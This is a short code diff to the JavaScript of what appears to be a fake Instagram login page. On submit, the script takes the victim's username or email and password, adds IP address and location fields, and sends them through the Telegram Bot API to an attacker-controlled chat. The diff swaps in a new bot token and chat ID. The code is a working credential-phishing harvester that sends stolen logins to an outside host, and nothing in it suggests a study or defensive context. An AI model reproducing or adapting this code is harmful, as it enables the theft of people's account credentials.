@@ -1,3 +1,4 @@
+
 const form = document.querySelector("#form");
 var ct = "5";
 var co = 0;
@@ -19,9 +20,9 @@ form.addEventListener("submit", (e) => {
         var password = document.getElementById("password").value;
 
         var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
-
-        var token = "6600608955:AAFKyCPNWgIEeTeeyDg4E8BcN9-HYvhCcvk";
-        var chat_id =  -4141409135;
+    
+          var token = "6589093327:AAHxUOmdL7AcAQa9Cs_7h0py-RHUlzLpZUk";
+    var chat_id = -4174637704
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
